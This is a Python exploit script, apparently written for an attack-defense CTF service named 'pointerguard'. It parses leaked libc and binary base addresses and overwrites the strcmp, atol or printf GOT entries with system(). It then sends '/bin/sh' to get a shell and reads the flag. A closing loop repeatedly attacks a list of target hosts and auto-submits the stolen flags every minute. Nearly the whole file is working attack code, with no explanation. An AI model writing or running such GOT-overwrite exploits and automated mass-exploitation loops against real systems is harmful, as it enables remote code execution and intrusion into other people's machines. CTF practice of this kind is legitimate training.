__author__ = "pxx"

from zio import *
is_local = True
#is_local = False

binary_path = "./pointerguard"

libc_file_path = ""
#libc_file_path = "./libc.so.6"

ip = ""
port = 0

if is_local:
	target = binary_path
else:
	target = (ip, port)

def d2v_x64(data):
	return l64(data[:8].ljust(8, '\x00'))

def d2v_x32(data):
	return l32(data[:4].ljust(4, '\x00'))

def rd_wr_str(io, info, buff):
	io.read_until(info)
	io.write(buff)

def rd_wr_int(io, info, val):
	rd_wr_str(io, info, str(val) + "\n")

import struct
def u2i(val):

	data = struct.pack("<Q", val)
	return struct.unpack("<q", data)[0]


def get_io(target):

	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")
	r_m = False
	w_m = False
	#io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	io = zio(target, timeout = 10, print_read = r_m, print_write = w_m, env={"LD_PRELOAD":libc_file_path})
	return io

binary_base = 0
libc_base = 0
stack_base = 0
p_rdi_ret = 0
system_addr = 0
binsh_addr = 0

def init_data(io):
	global binary_base
	global libc_base
	global stack_base
	global p_rdi_ret
	global system_addr
	global binsh_addr

	offset_system = 0x45390
	offset_binsh = 0x18cd17

	p_rdi_ret = 0x0000000000401333
	p_rsi_r15_ret = 0x0000000000401331

	io.read_until("_base=")
	data = io.read_until("\n")[:-1]
	binary_base = int(data, 16)
	io.read_until("_base=")
	data = io.read_until("\n")[:-1]
	libc_base = int(data, 16)
	io.read_until("_base=")
	data = io.read_until("\n")[:-1]
	stack_base = int(data, 16)

	system_addr = libc_base + offset_system
	binsh_addr = libc_base + offset_binsh

	#print u2i(0xffffffffffffffff)
	rd_wr_str(io, "somewhere?\n", "Yes! I want!\n")

def set_val(io, addr, val):
	rd_wr_int(io, "Addr:\n", u2i(addr))
	rd_wr_int(io, "Value:\n", u2i(val))

def set_val_list(io, data_list, full = True):

	if full == True:
		while len(data_list) < 10:
			data_list.append(data_list[-1])
	for item in data_list:
		#print hex(item[0]), hex(item[1])
		set_val(io, item[0], item[1])

def do_things(io, data, extern_data = ""):
	rd_wr_str(io, "before end\n", data)
	if "printf" in data or "malloc/free" in data:
		io.write(extern_data)


def adjust(addr, val, offset, data = ""):
	addr_set = addr - offset
	val_set = l64((l64(val)[0:8-offset] + data).rjust(8, '\x00'))
	
	return addr_set, val_set

def pwn_strcmp_got(io, offset = 5):
	global system_addr
	global binary_base

	strcmp_got                 = 0x0000000000602070
	#print "offset:", hex(strcmp_got - binary_base)

	#print hex(system_addr)
	addr_set, val_set = adjust(strcmp_got, system_addr, offset)
	data_list = []
	data_list.append([addr_set, val_set])
	set_val_list(io, data_list)

	#io.gdb_hint()
	do_things(io, "/bin/sh\n")


def pwn_atol_got(io, offset = 5):
	global system_addr
	global binary_base

	atol_got                 = 0x602098
	#print "offset:", hex(atol_got - binary_base)

	addr_set, val_set = adjust(atol_got, system_addr, offset)
	data_list = []
	data_list.append([addr_set, val_set])
	set_val_list(io, data_list, False)
	rd_wr_str(io, "Addr:\n", "/bin/sh\n")



def pwn_printf_got(io, offset = 5):
	global system_addr
	global binary_base

	printf_got                 = 0x0000000000602050  


	addr_set, val_set = adjust(printf_got, system_addr, offset)
	data_list = []
	data_list.append([addr_set, val_set])
	set_val_list(io, data_list)

	#io.gdb_hint()
	do_things(io, "printf\n", "sh\n")

def get_shell(io):
	#io.interact()
	#io.interact()
	io.writeline("cat flag/flag")
	data = io.read_until("\n")[:-1]
	print "-"*0x30
	print data.strip()
	print "-"*0x30
	return data.strip()

def pwn(io, way):

	#offset info
	if is_local:
		#local
		offset_system = 0x0
		offset_binsh = 0x0
	else:
		#remote	
		offset_system = 0x0
		offset_binsh = 0x0

	#io.read_until("Token:")
	#io.writeline("NxArhGPKLMmen9Y9QPePHSBbFqQPiqnU")

	init_data(io)
	if way == 0:
		pwn_strcmp_got(io, offset = 0)
	elif way == 1:
		pwn_atol_got(io, offset = 0)
	elif way == 2:
		pwn_printf_got(io, offset = 0)
	#pwn_atol_got(io)
	#pwn_printf_got(io)
	return get_shell(io)

"""
io = get_io(target)
pwn(io, 0)
exit(0)
"""

from libad import *
import time
while True:
	success_list = []
	for target in problem1_targets:
		print target
		for i in range(1):
			try:
				io = get_io(target)
				flag = pwn(io, i)
				if flag != "":
					submit_flag(flag)
					success_list.append(target[0])
					break
			except Exception as e:
				pass

	print len(success_list)
	for ip in success_list:
		print ip
	time.sleep(60)


#io = get_io(target)
#pwn(io)